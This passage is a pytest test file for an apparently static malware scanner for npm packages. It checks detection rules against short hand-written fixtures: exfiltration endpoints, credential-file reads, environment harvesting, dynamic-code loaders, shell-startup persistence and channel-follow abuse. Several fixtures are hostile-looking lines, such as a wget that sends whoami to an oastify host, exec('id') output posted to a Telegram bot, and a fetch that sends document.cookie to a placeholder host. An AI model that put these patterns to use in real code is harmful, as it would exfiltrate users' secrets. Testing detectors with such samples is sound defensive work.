"""Stage 2 file rules on inert, hand-written snippets (patterns only, nothing runnable)."""

import time

import pytest

from kitsunox.rules.static import RULES, EncodedBlob, EncodedUrl, FunctionRequire, Obfuscated
from kitsunox.stages.static import analyse

B64 = "QUJD" * 50 + "ZGVm0123XYZ" * 5  # >200 chars, mixed case and digits


@pytest.mark.parametrize(
    ("text", "rule"),
    [
        (
            'post("https://discord.com/api/webhooks/1093847562019384756/aB-c_d")',
            "static.exfil-endpoint",
        ),
        ("discordapp.com/api/v10/webhooks/987362514092837465/x", "static.exfil-endpoint"),
        ("fetch('https://api.telegram.org/botTOKEN/sendMessage')", "static.exfil-endpoint"),
        ("x.oastify.com", "static.exfil-endpoint"),
        (
            "post('https://hooks.slack.com/services/T04KQ7Z2M/B05RJ8XW1PL/xyz')",
            "static.exfil-endpoint",
        ),
        ("https://requestbin.net/r/abc", "static.exfil-endpoint"),
        ("readFileSync(home + '/.npmrc')", "static.sensitive-path"),
        ("path.join(os.homedir(), '.ssh/id_rsa')", "static.sensitive-path"),
        ("send(JSON.stringify(process.env))", "static.env-harvest"),
        ("for (k of Object.keys(process.env)) {}", "static.env-harvest"),
        ("get('http://45.33.32.156:8080/p')", "static.hardcoded-ip"),
        (f'const p = "{B64}"', "static.encoded-blob"),
        ("eval(atob(x))", "static.dynamic-code"),
        ("new Function('a', body)", "static.dynamic-code"),
        ("execSync('npm publish')", "static.npm-publish"),
        ("const cp = require('child_process')", "static.process-exec"),
        ("import https from 'node:https'", "static.network"),
        ('DEV_API_KEY: "aHR0cHM6Ly9leGFtcGxlLmludmFsaWQvaW5kZXguanNvbg=="', "static.encoded-url"),
        (
            "g('68747470733A2F2F6578616D706C652E696E76616C69642F696E6465782E6A736F6E')",
            "static.encoded-url",
        ),
        ("const u = `d3NzOi8vZXhhbXBsZS5pbnZhbGlkL3M=`", "static.encoded-url"),
        ('const h = new Function.constructor("require", body)', "static.function-require"),
        ("const h = new (Function.constructor)('require', res.token)", "static.function-require"),
        ("Function(`require`, src)(require)", "static.function-require"),
    ],
)
def test_rule_fires(text: str, rule: str) -> None:
    assert rule in {m.rule_id for m in analyse(text.encode())}


@pytest.mark.parametrize(
    "text",
    [
        "get('http://127.0.0.1:3000/')",  # loopback
        "get('http://10.0.0.1/')",  # private
        "isOnline([`https://1.1.1.1`, `https://8.8.8.8`])",  # public DNS resolvers (v2)
        "var g = Function('return this')();",  # global-object polyfill
        'new Function("return this")()',
        "obj.eval(x); retrieval(x)",  # method / substring, not the global eval
        f'url("data:image/png;base64,{B64}")',  # embedded image
        "a" * 400,  # not base64-like
        "const env = process.env.NODE_ENV",
        "// Webhook URL (https://hooks.slack.com/services/...)",  # docs placeholder
        "https://discord.com/api/webhooks/xxxx/xxxx",  # no digits: not even a placeholder id
        "type OscoreRequestBinding = {}",  # identifier, not the service
        "x = 'data:application/json;base64,eyJzb3VyY2VzIjpbImh0dHBzOi8veCJdfQ=='",  # source map
        "x = 'abcaHR0cHM6Ly9leGFtcGxlLmludmFsaWQvaW5kZXguanNvbg=='",  # not the whole literal
        "x = 'aHR0cHM6Ly8BAmJhZA=='",  # decodes to control characters
        "x = '68747470733a2f2f'",  # the scheme alone
        "new Function('exports', 'require', 'module', src)",  # require is not the first argument
        "obj.myFunction('require', x)",  # a method that ends in Function
    ],
)
def test_benign_lookalikes_do_not_fire(text: str) -> None:
    flagged = {m.rule_id for m in analyse(text.encode()) if m.severity.value != "low"}
    assert flagged == set(), flagged


def test_matches_carry_line_and_truncated_snippet() -> None:
    text = "line one\n" + "x = '" + "Ab1" * 400 + "'\n"
    (match,) = EncodedBlob().evaluate_text(text)
    assert match.line == 2 and len(match.snippet) < 200


def test_obfuscation_needs_many_identifiers() -> None:
    few = " ".join(f"_0x{i:04x}" for i in range(5))
    many = " ".join(f"_0x{i:04x}" for i in range(30))
    assert Obfuscated().evaluate_text(few) == []
    assert len(Obfuscated().evaluate_text(many)) == 1


def test_binary_and_huge_files_are_skipped() -> None:
    assert analyse(b"\x00\x01eval(x)") == ()
    assert analyse(b"eval(x)" + b" " * (17 * 1024 * 1024)) == ()


def test_matches_are_capped_per_rule() -> None:
    assert len([m for m in analyse(b"eval(a);" * 50) if m.rule_id == "static.dynamic-code"]) == 3
    assert len(RULES) == len({r.id for r in RULES})


@pytest.mark.parametrize(
    "text",
    [
        "url: 'https://hooks.slack.com/services/xxx/xxx/xxx'",  # lower-case placeholder ids
        # Slack's documented placeholder, built here so secret scanners don't flag the literal.
        "https://hooks.slack.com/services/" + "T00000000/B00000000/" + "X" * 24,
        "https://discord.com/api/webhooks/123/abc",  # too short for a snowflake
        "https://discord.com/api/webhooks/000000000000000000/token",  # repeated digit
        "https://discord.com/api/webhooks/123456789012345678/token",  # counting up
    ],
)
def test_placeholder_webhooks_are_labelled_not_dropped(text: str) -> None:
    ids = {m.rule_id: m.severity.value for m in analyse(text.encode())}
    assert ids.get("static.webhook-placeholder") == "medium", ids
    assert "static.exfil-endpoint" not in ids


def test_tunnel_suffixes_and_region_hosts_still_count() -> None:
    """Benign code has these too, but 11 `vm-day1` samples are caught only through ngrok's
    region hosts and 29 only through bare suffixes or `bot${token}` (2026-10-30)."""

    def fires(text: str) -> bool:
        return any(m.rule_id == "static.exfil-endpoint" for m in analyse(text.encode()))

    assert fires('const regions = ["ap.ngrok.io", "EU.ngrok.io", "us.ngrok.io"];')
    assert fires("host.endsWith('.trycloudflare.com')")
    assert fires("fetch(`https://api.telegram.org/bot${token}/sendMessage`)")
    assert fires("fetch('https://3f2a-81-2-69-142.ngrok-free.app/c')")


def test_a_written_telegram_placeholder_is_documentation() -> None:
    """`glimmervoid`: "open https://api.telegram.org/bot<token>/getUpdates in a browser"."""

    def fires(text: str) -> bool:
        return any(m.rule_id == "static.exfil-endpoint" for m in analyse(text.encode()))

    assert not fires("then open https://api.telegram.org/bot<token>/getUpdates in a browser")
    assert not fires("curl https://api.telegram.org/botYOUR_BOT_TOKEN/getMe")
    assert not fires("https://api.telegram.org/bot.../sendMessage")
    assert fires("fetch('https://api.telegram.org/bot7123456789:AAH4x/sendMessage')")
    assert fires('fetch("https://api.telegram.org/bot" + t + "/sendMessage")')


def test_a_real_looking_webhook_is_not_also_a_placeholder() -> None:
    ids = {
        m.rule_id
        for m in analyse(b"post('https://discord.com/api/webhooks/1093847562019384756/x')")
    }
    assert ids >= {"static.exfil-endpoint"} and "static.webhook-placeholder" not in ids


def test_encoded_url_says_what_it_decodes_to() -> None:
    text = "const u = atob('aHR0cDovLzIwMy4wLjExMy45L3A=')"
    (match,) = EncodedUrl().evaluate_text(text)
    assert match.severity.value == "medium"
    assert "`http://203.0.113.9/p`" in match.explanation


def test_encoded_url_accepts_url_safe_base64() -> None:
    (match,) = EncodedUrl().evaluate_text('"aHR0cHM6Ly9leGFtcGxlLmludmFsaWQvP2E9Pj4-"')
    assert "https://example.invalid/?a=>>>" in match.explanation


def test_function_require_is_linear_on_long_whitespace() -> None:
    # Quadratic before possessive quantifiers: 32k spaces took 0.44 s, 1M would take minutes.
    rule = FunctionRequire()
    for text in (
        "Function" + " " * 1_000_000 + "x",
        "Function" + " " * 500_000 + ")" + " " * 500_000,
    ):
        started = time.perf_counter()
        assert not list(rule.pattern.finditer(text))
        assert time.perf_counter() - started < 1.0
    assert rule.pattern.search("Function \n ) ( 'require' , body")


def test_encoded_blob_is_linear_on_runs_just_too_short() -> None:
    # Before the lookbehind every position of a 199-character run rescanned it: 4M chars of
    # such runs took 2.4 s (now 50 ms).
    rule = EncodedBlob()
    for run in ("A" * 199, "a1" * 99 + "f"):
        text = (run + ".") * 20_000
        started = time.perf_counter()
        assert not list(rule.pattern.finditer(text))
        assert time.perf_counter() - started < 1.0
    text = "x." + "A" * 199 + "." + B64 + "==AAAA"
    assert [m.span() for m in rule.pattern.finditer(text)] == [(202, 202 + len(B64) + 2)]


def test_interact_sh_needs_a_boundary() -> None:
    """`cortico-world-qqbot-feibi`: `this.interact.shareLink(body)` was HIGH."""

    def fires(text: str) -> bool:
        return any(m.rule_id == "static.exfil-endpoint" for m in analyse(text.encode()))

    assert not fires("return brief(await this.interact.shareLink(body), 800)")
    assert fires("fetch('https://c0ffee.interact.sh/x')")
    assert fires("const h = 'interact.sh'")


@pytest.mark.parametrize(
    "text",
    [
        # dsh-security-pack's vet checks, wrapped over lines
        "const BAD = ['webhook.site', 'requestbin.net', 'requestcatcher.com',\n"
        "  'oastify.com', 'interact.sh', 'pipedream.net', 'api.telegram.org/bot'];",
        # an agent policy engine's deny list
        'deny: ["pastebin.com", "hastebin.com", "x.m.pipedream.net", "webhook.site"]',
    ],
)
def test_a_deny_list_of_services_is_not_an_endpoint(text: str) -> None:
    assert not any(m.rule_id == "static.exfil-endpoint" for m in analyse(text.encode()))


@pytest.mark.parametrize(
    "text",
    [
        "const hosts = ['webhook.site', 'pipedream.net'];",  # two services: not a list
        "['webhook.site', 'webhook.site', 'x.webhook.site', 'pipedream.net']",  # still two
        # URLs, not whole host literals, beside a list
        "send('https://webhook.site/abc'); ['oastify.com', 'interact.sh', 'pipedream.net']",
        'fetch("https://api.telegram.org/bot" + t); '
        'x = ["oastify.com", "webhook.site", "a.ngrok.io"]',
        "if (h.endsWith('.trycloudflare.com')) go()",
    ],
)
def test_endpoints_outside_a_deny_list_still_count(text: str) -> None:
    assert any(m.rule_id == "static.exfil-endpoint" for m in analyse(text.encode()))


def _exfil(text: str) -> list[tuple[str, float]]:
    return [
        (m.severity.value, m.weight)
        for m in analyse(text.encode())
        if m.rule_id == "static.exfil-endpoint"
    ]


@pytest.mark.parametrize(
    "text",
    [
        "Set PUBLIC_URL=https://example.ngrok.app before starting.",
        "// e.g. https://xxx.trycloudflare.com",
        "url: 'https://your-tunnel-name.ngrok-free.app/webhook'",
        "ssh -R 80:localhost:3000 <your-subdomain>.serveo.net",
        "allow: ['*.ngrok.io']",
        "const u = `https://${sub}.trycloudflare.com`",
        "host = '{name}.ngrok.app'",
        "see https://foo.ngrok.io or https://abc123.ngrok.io",
        "MY_APP.ngrok.io",
        "https://....ngrok-free.app",
    ],
)
def test_a_placeholder_tunnel_host_is_low(text: str) -> None:
    """v6 (F3c): the tunnel host's own label is a placeholder: documentation."""
    found = _exfil(text)
    assert found and set(found) == {("low", 1.0)}
    (match,) = [m for m in analyse(text.encode()) if m.rule_id == "static.exfil-endpoint"][:1]
    assert match.explanation.endswith("documentation, not an endpoint.")


@pytest.mark.parametrize(
    "text",
    [
        "fetch('https://purple-river-1234.trycloudflare.com/c')",  # a real quick-tunnel name
        "https://sidebar.ngrok.io/x",  # a word, not a placeholder label
        "https://myexample.ngrok.io/x",
        # a bare suffix in a file that collects (v8 lowers it in one that doesn't)
        "if (h.endsWith('.trycloudflare.com')) go(os.hostname())",
        "require('child_process'); x = 'https://example.com/webhook.site'",  # not a tunnel host
    ],
)
def test_a_real_tunnel_host_stays_high(text: str) -> None:
    assert ("high", 5.0) in _exfil(text)


def test_a_host_in_a_list_of_domains_is_low() -> None:
    """v6 (F3b): a disposable-mail list naming `webhook.site` among mail domains."""
    text = "const DISPOSABLE = [\n  '10minutemail.com',\n  'webhook.site',\n  'mailinator.com',\n];"
    (match,) = [m for m in analyse(text.encode()) if m.rule_id == "static.exfil-endpoint"]
    assert (match.severity.value, match.weight) == ("low", 1.0)
    assert match.explanation.endswith("A host in a list of domains, not an endpoint.")


@pytest.mark.parametrize(
    "text",
    [
        # v8 lowers a bare `webhook.site` in a file that collects nothing: these collect
        "os.hostname(); const hosts = ['webhook.site', 'mailinator.com'];",  # not a list
        # a URL
        "send('https://webhook.site/0b1c2d3e-77bf-4ccb-8ba0-e5a652841e0a', ['a.com', 'b.com'])",
        "os.hostname(); x = ['1.0.0', 'webhook.site', '2.0.0']",  # versions: no domains
        "os.hostname(); x = ['webhook.site', 'index.js', 'webhook.site']",  # its own host
        "os.hostname(); x = ['webhook.site', 'a.com', 'A.com', 'a.com']",  # one domain
        "os.hostname(); h = 'webhook.site'" + " " * 500 + "['a.com', 'b.com']",  # too far
        # a table of ngrok's region hosts: kept on purpose since v5 (gina, cro-pricing)
        "REGIONS = {us: 'us.ngrok.io', eu: 'eu.ngrok.io', ap: 'ap.ngrok.io', au: 'au.ngrok.io'}",
        "x = ['webhook.site', 'a.ngrok.io', 'mailinator.com']",  # one other non-endpoint
    ],
)
def test_a_host_outside_a_domain_list_stays_high(text: str) -> None:
    assert ("high", 5.0) in _exfil(text)


@pytest.mark.parametrize(
    ("text", "note"),
    [
        # core-js's comment, bundled into many builds (`@mnykj/alleditor`, `dh-vue-poster`)
        (
            "        // causes a crash (https://pastebin.com/N21QzeQA) when trying to debug it.",
            "core-js cites in a code comment (a Safari debugger crash): not an endpoint.",
        ),
        # host patterns in allow and deny lists (`@pinnacleplugins/*`, `agentshield`)
        ("`*.make.com`,`hook.integromat.com`,`*.m.pipedream.net`]", "nothing connects to"),
        ('      "*.webhook.site",', "nothing connects to"),
        # a disposable-mail list written as one string, with `\n` / `\t` escapes
        (
            "'yn.io\\nwebclub.infos.st\\nwebemail.me\\nwebhook.site\\nwebinarmoa.com\\nwebm4il.info'",
            "A host in a list of domains, not an endpoint.",
        ),
        (
            "'webhane.com\\t18\\nwebhocseo.com\\t2\\nwebhook.site\\t19\\nwebhosting.org\\t2\\n'",
            "A host in a list of domains, not an endpoint.",
        ),
        ("ap.it\nap.leg.br\nap.ngrok.io\naparecida.br\n", "A host in a list of domains"),
        ("K=`webhook.site,requestcatcher.com,ngrok.io,example.org`", "A host in a list"),
        # an OAST host whose own label is a placeholder
        (
            "fetch('http://YOUR-COLLABORATOR-ID.oastify.com' + btoa(document.cookie))",
            "A placeholder host: documentation, not an endpoint.",
        ),
        ('const COLLAB = "your-collab-domain.oastify.com";', "A placeholder host"),
        ("// e.g. http://xxxxxxxxx.oastify.com", "A placeholder host"),
        ("ping <id>.burpcollaborator.net", "A placeholder host"),
    ],
)
def test_what_cannot_be_an_endpoint_is_low(text: str, note: str) -> None:
    """v7 (round 3, X1-X4)."""
    matches = [m for m in analyse(text.encode()) if m.rule_id == "static.exfil-endpoint"]
    assert matches
    assert {(m.severity.value, m.weight) for m in matches} == {("low", 1.0)}
    assert all(note in m.explanation for m in matches)


@pytest.mark.parametrize(
    "text",
    [
        "fetch('https://pastebin.com/raw/N21QzeQA')",  # read through the raw endpoint
        "fetch('https://pastebin.com/N21QzeQAb')",  # another paste
        "fetch('https://pastebin.com/xYz12345')",
        "os.hostname(); x = '**webhook.site** receives it'",  # Markdown emphasis
        "dns.lookup(`94bp9h8fte9kz9v8btc6in8qnht8h85x.oastify.com`, () => {});",  # a real id
        # a real id behind a word (`@frontend-clients/core@99.0.8`, DataDog malicious)
        "wget http://YourServer929w1e528by00hxp38ah5mh1asgj4bs0.oastify.com/?u=$(whoami)",
        "dns.lookup(`${hex}.oastify.com`)",  # a template: how DNS exfiltration builds hosts
        "x = 'a.com\\nwebhook.site'",  # one other domain: not a list
        # a URL, not an entry
        "post('https://webhook.site/0b1c2d3e-77bf-4ccb-8ba0-e5a652841e0a,https://a.com,https://b.com')",
        "x = 'eu.ngrok.io\\nus.ngrok.io\\nap.ngrok.io\\nau.ngrok.io'",  # a table of endpoints
        "os.hostname(); x = 'webhook.site\\nmailinator.com'" + " " * 500 + "'\\na.com\\nb.com\\n'",
        # a handed token in a file that collects (v8 lowers it in one that doesn't)
        "post(`https://api.telegram.org/bot${t}/x`, ['\\na.com', '\\nb.com'], os.hostname())",
    ],
)
def test_endpoints_v7_keeps_high(text: str) -> None:
    assert ("high", 5.0) in _exfil(text)


def test_example_addresses_are_low_and_more_resolvers_are_not_findings() -> None:
    """`static.hardcoded-ip` v4 (round 3, X5)."""

    def ips(text: str) -> list[tuple[str, float, str]]:
        return [
            (m.severity.value, m.weight, m.explanation)
            for m in analyse(text.encode())
            if m.rule_id == "static.hardcoded-ip"
        ]

    for text in ("placeholder: 'https://1.2.3.4:8443'", "// e.g. ws://123.45.67.89:3000/x"):
        ((severity, weight, why),) = ips(text)
        assert (severity, weight) == ("low", 1.0)
        assert why.endswith("An address documentation uses as an example.")
    for resolver in ("223.5.5.5", "223.6.6.6", "119.29.29.29", "114.114.114.114"):
        assert ips(f"doh = 'https://{resolver}/dns-query'") == []
    assert ips("get('http://45.33.32.156:8080/p')")[0][:2] == ("medium", 3.0)
    assert ips("get('http://1.2.3.5/p')")[0][:2] == ("medium", 3.0)


def test_low_matches_never_hide_a_real_one() -> None:
    """Placeholders don't count toward the rule's cap of matches."""
    text = "\n".join(
        ["see https://example.ngrok.app"] * 5
        + ["post('https://webhook.site/0b1c2d3e-77bf-4ccb-8ba0-e5a652841e0a')"]
    )
    found = _exfil(text)
    assert found.count(("low", 1.0)) == 3
    assert found[-1] == ("high", 5.0)


_UUID = "0b1c2d3e-77bf-4ccb-8ba0-e5a652841e0a"


@pytest.mark.parametrize(
    ("text", "note"),
    [
        # notifiers for the user's own bot: the code is handed the token
        (
            "await fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, opts)",
            "a notifier for the user's own bot.",
        ),
        ('const base = "https://api.telegram.org/bot" + token;', "the user's own bot."),
        ('"url": "https://api.telegram.org/bot{{TELEGRAM_BOT_TOKEN}}/getMe"', "own bot."),
        ("$r = wp_remote_post('https://api.telegram.org/bot'.tg_token().'/sendMessage');", "bot."),
        ('url = f"https://api.telegram.org/bot{self.token}/sendMessage"', "own bot."),
        # a webhook.site mention with no bin id near it
        ('example: "curl https://webhook.site/test",', "a mention, not an endpoint."),
        ("  # For testing, create a sample alerting webhook at http://webhook.site/", "mention"),
        # a tunnel's bare suffix, and the API cloudflared registers with
        ("if (!host.endsWith('.trycloudflare.com')) return false", "no tunnel's name"),
        ("server: { allowedHosts: ['.ngrok-free.app'] }", "no tunnel's name"),
        (" * a random https://….trycloudflare.com address, no account needed", "tunnel's name"),
        ("log('no URL (api.trycloudflare.com reachable?)')", "no tunnel's name"),
    ],
)
def test_what_names_no_endpoint_in_a_quiet_file_is_low(text: str, note: str) -> None:
    """v8 (round 4, D1-D3): nothing in the file collects anything to send."""
    matches = [m for m in analyse(text.encode()) if m.rule_id == "static.exfil-endpoint"]
    assert matches
    assert {(m.severity.value, m.weight) for m in matches} == {("low", 1.0)}
    assert all(note in m.explanation for m in matches)


@pytest.mark.parametrize(
    "text",
    [
        # what is sent: identity, the environment, files, processes, credentials
        "const t = process.env.BOT; fetch(`https://api.telegram.org/bot${t}/x?h=${os.hostname()}`)",
        "post(`https://api.telegram.org/bot${t}/sendMessage`, {text: JSON.stringify(process.env)})",
        "form.append('document', fs.createReadStream(p));"
        " axios.post(`https://api.telegram.org/bot${t}/sendDocument`, form)",
        "for (const f of fs.readdirSync(dir)) post(`https://api.telegram.org/bot${t}/x`, f)",
        "const { exec } = require('child_process'); exec('id', o =>"
        " fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?text=${o}`))",
        "send(read(home + '/.npmrc'), `https://api.telegram.org/bot${t}/sendMessage`)",
        "if (seedPhrase) post(`https://api.telegram.org/bot${t}/sendMessage`, seedPhrase)",
        # a token literal anywhere in the file, the token written in the URL, a shell token
        "const T = '7123456789:AAH4xYzAbCdEfGhIjKlMnOpQrStUvWxYz12'; "
        "fetch(`https://api.telegram.org/bot${T}/sendMessage`)",
        "fetch('https://api.telegram.org/bot7123456789:AAH4x/sendMessage')",
        'curl -s "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" -d text=hi',
        # an install hook's line
        '  "postinstall": "node -e \\"fetch(\'https://api.telegram.org/bot\'+t)\\""',
        # a webhook.site bin id near the host, or a custom subdomain
        f"const options = {{ hostname: 'webhook.site', path: '/{_UUID}', method: 'POST' }};",
        f"fetch('https://webhook.site/{_UUID}', {{ method: 'POST', body }})",
        "fetch('https://acme.webhook.site/in', { method: 'POST', body })",
        # a real quick-tunnel name, a TCP tunnel, a bare suffix in a file that collects
        "fetch('https://purple-river-1234.trycloudflare.com/c')",
        "client.connect(13532, '0.tcp.in.ngrok.io', () => {})",
        "if (h.endsWith('.trycloudflare.com')) send(os.userInfo())",
    ],
)
def test_what_is_sent_keeps_high(text: str) -> None:
    """v8: anything collected in the same file, a written token, a bin id, a tunnel's name."""
    assert ("high", 5.0) in _exfil(text)


def test_ip_on_a_comment_line_is_low() -> None:
    """`static.hardcoded-ip` v5 (round 4, D4)."""

    def ips(text: str) -> list[tuple[str, float]]:
        return [
            (m.severity.value, m.weight)
            for m in analyse(text.encode())
            if m.rule_id == "static.hardcoded-ip"
        ]

    for text in (
        "    // return 'http://47.108.170.69:5401'",
        "  // baseURL: 'http://120.253.136.198:36011/sy/h5/init'",
        " * @returns `https://cube.example.org/api/v1/` or `http://129.153.33.80/api/v1/`.",
        "/* fallback: http://45.33.32.156:8080 */",
        "# curl http://45.33.32.156/x",
        "<!-- served from http://45.33.32.156 -->",
    ):
        assert ips(text) == [("low", 1.0)], text
    for text in (
        'const API = "http://45.33.32.156:8080";',
        '/*! lib v1 */ fetch("http://45.33.32.156/x")',  # the comment closed before it
        'const u = "http://45.33.32.156/x" // prod',  # code, then a comment
        "#!/bin/sh\nwget http://45.33.32.156/p",  # a shebang is no comment
        "#hdr { background: url(http://45.33.32.156/x.png) }",  # a CSS selector
    ):
        assert ("medium", 3.0) in ips(text), text


@pytest.mark.parametrize(
    "text",
    [
        'new Function("require", "module", "exports", code)(load, mod, mod.exports)',
        "const fn = new Function('require', 'module', 'exports', 'registerSlotBuilders', src);",
        'new Function("require", "exports", compiled)(req, exp)',
    ],
)
def test_a_module_wrapper_in_a_quiet_file_is_low(text: str) -> None:
    """`static.function-require` v2 (round 4, D5)."""
    (match,) = [m for m in analyse(text.encode()) if m.rule_id == "static.function-require"]
    assert (match.severity.value, match.weight) == ("low", 1.0)
    assert "A module wrapper" in match.explanation


@pytest.mark.parametrize(
    "text",
    [
        'new Function("require", runnable)(require);',  # `require` alone
        "(new Function('require','__dirname',''))(require,__dirname);",
        "const data = await (await fetch(url)).json(); new Function("
        "'require', 'module', 'exports', data.credits)(require, m, m.exports);",
        'new Function("require", "module", Buffer.from(s, "base64").toString())(require, m)',
        "new (Function.constructor)('require', 'module', response.data.model)(require, m)",
    ],
)
def test_a_loader_that_fetches_or_decodes_stays_medium(text: str) -> None:
    (match,) = [m for m in analyse(text.encode()) if m.rule_id == "static.function-require"]
    assert (match.severity.value, match.weight) == ("medium", 3.0)


# Inert stand-ins for a Baileys fork's code: made-up channel ids, nothing that runs.
_JID = "120363000000000001@newsletter"
_API = "newsletterFollow: async (jid) => { await newsletterWMexQuery(jid, QueryIds.FOLLOW) },"


def _follows(text: str) -> bool:
    return any(m.rule_id == "static.channel-follow" for m in analyse(text.encode()))


@pytest.mark.parametrize(
    "text",
    [
        # A hard-coded channel followed once the socket opens (`@ubedsockets/baileys`).
        f"const AUTO = '{_JID}'; ev.on('connection.update', async () => {{"
        " await newsletterWMexQuery(AUTO, QueryIds.FOLLOW) });",
        # Base64-hidden ids, FOLLOW through `mexQuery` (`kevinx-baileys`, `@sakataa/baileys`).
        "const ids = ['MTIwMzYzMDAwMDAwMDAwMDAxQG5ld3NsZXR0ZXI=']; // newsletter\n"
        "setTimeout(() => mexQuery({ newsletter_id: Buffer.from(ids[0], 'base64').toString() },"
        " Types.QueryIds.FOLLOW, p), 9000)",
        # Invite codes resolved and followed (`@gopyr/baileys`).
        "for (const code of ['0029VaAAAAAAAAAAAAAAAAAA']) { const m = await"
        " sock.newsletterMetadata('invite', code); await sock.newsletterFollow(m.id) }",
        # A fetched list (`luna-baileys` copies).
        "const r = await fetch(LIST); for (const id of await r.json()) { if"
        " (!id.endsWith('@newsletter')) continue; await executeWMexQuery({ newsletter_id: id },"
        " QueryIds.FOLLOW, x) }",
        # Method name and ids from char codes (`felicia-baileys`): "newsletterFollow" and a JID.
        "const f = c => c.map(v => String.fromCharCode(v)).join(''); // newsletter\n"
        "sock[f([110,101,119,115,108,101,116,116,101,114,70,111,108,108,111,119])]"
        "(f([49,50,48,51,54,51,48,48,48,48,48,48,48,48,48,48,48,49,64,110,101,119,115,108,101,"
        "116,116,101,114]))",
        # Default-on and disclosed is still unwanted (`@leonoremods/baileys`).
        f"const autoFollowChannels = cfg.autoFollowChannels ?? ['{_JID}'];\n"
        "for (const jid of autoFollowChannels) newsletterWMexQuery(jid, QueryIds.FOLLOW)",
    ],
)
def test_channel_follow_fires(text: str) -> None:
    assert _follows(text)


@pytest.mark.parametrize(
    "text",
    [
        _API + f" // e.g. sock.newsletterFollow('{_JID}')",  # the API, documented
        "async newsletterFollow(jid) { return this.query(jid, QueryIds.FOLLOW) } // newsletter",
        f"QueryIds['FOLLOW'] = '7871414976211147'; const NEWS = '{_JID}';",  # assignment
        # Opt-in (`shadowx-baileys`): only when the user turns it on.
        f"if (opts.autoFollowChannel === true) {{ sock.newsletterFollow('{_JID}') }}",
        "follow: (ref) => sock.newsletterFollow(toJid(ref)), // newsletter helper",  # no source
        f"api.follow(Action.FOLLOW, '{_JID[:18]}')",  # not WhatsApp: no "newsletter" text
        # Byte tables are not hidden strings; a wrapper with no channels of its own.
        "const t = [10, 20, 300, 40, 50, 60, 70, 80, 90]; // newsletter\n"
        "export const follow = (sock, id) => sock.newsletterFollow(id)",
    ],
)
def test_channel_follow_ignores_the_api_and_opt_in(text: str) -> None:
    assert not _follows(text)


def test_channel_follow_says_unwanted_not_malware() -> None:
    (match,) = [
        m
        for m in analyse(f"const A = '{_JID}'; newsletterWMexQuery(A, QueryIds.FOLLOW)".encode())
        if m.rule_id == "static.channel-follow"
    ]
    assert match.severity.value == "medium" and match.weight == 3.0
    assert "Unwanted" in match.explanation and "names channels" in match.explanation


def _tags(text: str) -> list[str]:
    return [
        m.severity.value for m in analyse(text.encode()) if m.rule_id == "static.channel-tagging"
    ]


_CONTEXT = "contentType: proto.ContextInfo.ForwardedNewsletterMessageInfo.ContentType.UPDATE"


@pytest.mark.parametrize(
    "jid",
    [
        f"process.env.NEWSLETTER_ID || '{_JID}'",  # `@codexverified/baileys` 2.19.18
        f"'{_JID}'",  # `@lunabotv6/luna-baileys@8.1.0`
        f"cfg.channel ?? `{_JID}`",
    ],
)
def test_channel_tagging_fires_on_a_fixed_channel_in_the_forwarded_context(jid: str) -> None:
    text = f"newsletter: {{ newsletterJid: {jid}, newsletterName: 'x', {_CONTEXT} }}"
    assert _tags(text) == ["medium"]


@pytest.mark.parametrize(
    "text",
    [
        # Upstream: the protobuf field and a caller's own JID.
        "optional string newsletterJid = 1; // ForwardedNewsletterMessageInfo",
        f"forwardedNewsletterMessageInfo: {{ newsletterJid: jid, {_CONTEXT} }}",
        # A fixed JID without the forwarded context (a follow is `static.channel-follow`'s).
        f"const n = {{ newsletterJid: '{_JID}' }}",
    ],
)
def test_channel_tagging_ignores_the_field_and_callers_jids(text: str) -> None:
    assert _tags(text) == []


def test_channel_tagging_is_never_not_new() -> None:
    """Like a follow: every release of a fork that tags the user's messages does it again."""
    from kitsunox.stages.static import ALWAYS_NEW

    assert "static.channel-tagging" in ALWAYS_NEW


def _startup_forms(text: str) -> dict[str, str]:
    """form -> severity of the `static.shell-startup` matches."""
    return {
        m.explanation.rsplit("`", 2)[1]: m.severity.value
        for m in analyse(text.encode())
        if m.rule_id == "static.shell-startup"
    }


@pytest.mark.parametrize(
    ("text", "form"),
    [
        # Inert stand-ins: the appended lines are placeholders, nothing that runs.
        ('{"scripts": {"postinstall": "echo PLACEHOLDER >> ~/.bashrc"}}', "hook"),
        ('{"scripts": {"install": "printf x | tee -a \\"$HOME/.zshrc\\""}}', "hook"),
        ("echo 'alias x=y' >> \"$HOME/.zshrc\"\n", "shell"),
        ("Add-Content -Path $PROFILE -Value 'x'", "shell"),
        (
            "const line = 'source \"$HOME/.cache/x/init.sh\"';\n"
            "fs.writeFileSync(path.join(env.HOME, shell === 'bash' ? '.bashrc' : '.zshrc'), line)",
            "inject",
        ),
        (
            "const s = ['setopt prompt_subst', 'PROMPT=\"$(node r.js)\"'].join('\\n');\n"
            "fs.writeFileSync(join(os.homedir(), '.cache', 'init.zsh'), s)",
            "inject",
        ),
        ("fs.appendFileSync(path.join(os.homedir(), '.bashrc'), line)", "code"),
        ("const rc = '~/.config/fish/config.fish'; writeFile(expand(rc, HOME), s)", "code"),
    ],
)
def test_shell_startup_forms(text: str, form: str) -> None:
    forms = _startup_forms(text)
    # Install hooks and injected source/prompt lines report; a CLI's own writes are evidence.
    assert forms.get(form) == ("medium" if form in ("hook", "inject") else "low"), forms


@pytest.mark.parametrize(
    "text",
    [
        "const s = fs.readFileSync(path.join(os.homedir(), '.bashrc'), 'utf8')",  # read only
        "// add `export PATH=...` to your ~/.zshrc",  # advice, no write
        "user.profile = await load(); fs.writeFileSync(out, HOME)",  # a property, not the file
        "run('make >> build.log')",  # a redirect to something else
        '{"scripts": {"test": "echo ok"}}',
        # A hook that writes elsewhere, and a start-up file named only in the description.
        '{"scripts": {"postinstall": "node setup.js > log.txt"}, "description": "no ~/.bashrc"}',
        # The name, a write and HOME, but too far apart to belong together.
        "const rc = '.zshrc';" + " " * 1200 + "fs.writeFileSync(path.join(HOME, 'out.json'), x)",
    ],
)
def test_shell_startup_needs_a_write_to_the_file(text: str) -> None:
    assert _startup_forms(text) == {}


@pytest.mark.parametrize(
    "text",
    [
        # Reloading the user's own start-up file, and a source line in a file naming none.
        "const rc = '.zshrc'; exec('. \"$HOME/.profile\"'); fs.writeFileSync(join(HOME, f), x)",
        "const s = 'source \"$HOME/.cache/x/init.sh\"'; fs.writeFileSync(join(HOME, f), s)",
        # An AI prompt in a shell variable, not a shell prompt (no `prompt_subst`).
